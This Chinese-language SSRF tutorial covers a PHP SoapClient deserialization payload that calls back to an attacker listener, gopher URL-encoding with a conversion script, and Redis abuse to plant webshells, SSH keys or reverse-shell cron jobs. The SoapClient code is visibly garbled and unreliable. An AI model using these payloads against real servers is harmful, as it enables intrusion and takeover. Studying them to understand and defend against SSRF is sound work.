**SoapClient**
SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP
的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。
SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
  * 第一个参数是用来指明是否是wsdl模式。
  * 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。
知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：
    // ssrf.php'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?>
47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：
如上图所示，ssrf触发成功。
由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头。见[详情](https://www.anquanke.com/post/id/202025)
###  SSRF漏洞利用的相关协议
SSRF漏洞的利用所涉及的协议有：
  * file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容
  * dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等
  * gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell
  * http/s协议：探测内网主机存活
**_以这俩文件为本章的实验文件_**
###  File协议
读取本地文件用的
###  HTTP协议
探测一下内网活着的主机（但是很多不会开Http协议，没多大用）
抓一下包，丢BP里面探测一下就行（我自己靶场没写那逻辑，写个思路就行）
###  Dict协议
结合端口探测内网服务
比如看看Mysql（这个是需要授权导致的错误，后面会讲）
看看Redis（未授权访问成功的样子）
###  Gopher协议
**定义**
Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；
>
> gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议
**限制**
gopher协议在各个编程语言中的使用限制
> —wite-curlwrappers选项含义：运用curl工具打开url流  
>  curl使用curl —version查看版本以及支持的协议
Curl的所需参数是一个URL，即URLEncode后的链接（重点）
**格式**
> gopher://:/_后接TCP数据流
  * gopher的默认端口是70
  * 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码（详细注意事项见下）
**Gopher发送Get请求**
> 1、问号（？）需要转码为URL编码，也就是%3f  
>  2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a  
>  3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
可能还没明白:sweat_smile:，写了个脚本直接转换，结果直接复制到BP即可；data是你的报文
    import reimport urllib.parsedata=\    '''GET /try.php?a=Wan&b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close'''data=urllib.parse.quote(data)strinfo=re.compile('%0A',re.I)new=strinfo.sub('%0D%0A',data)new='gopher://192.168.0.130:8201/_'+new+'%0D%0A'new=urllib.parse.quote(new)with open('Result.txt','w') as f:    f.write(new)with open('Result.txt','r') as f:    for line in f.readlines():        print(line.strip())
因为BP是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码
这样到达服务器一次解码得到的就是
>
> gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-> Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-> Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-> exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-> Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-> CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A
这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事
**Gopher发送POST请求**
和GET请求一样，放入脚本编码后即可放到URL中
如果改成了POST格式捏？
如果是Content-type为application/x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）
form-data的话就不需要
**使用注意事项**
  * 大部分 PHP 并不会开启 fopen 的 gopher wrapper
  * file_get_contents 的 gopher 协议不能 URLencode
  * file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败
  * PHP 的 curl 默认不 follow 302 跳转
  * curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用
## Redis未授权攻击
概念如下
> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将
> Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis
> 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config
> 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys
> 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
>
> 简单说，漏洞的产生条件有以下两点：
>
>   * redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
>   * 没有设置密码认证（默认为空），可以免密码远程登录redis服务。
>
在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用
Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等…..
思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。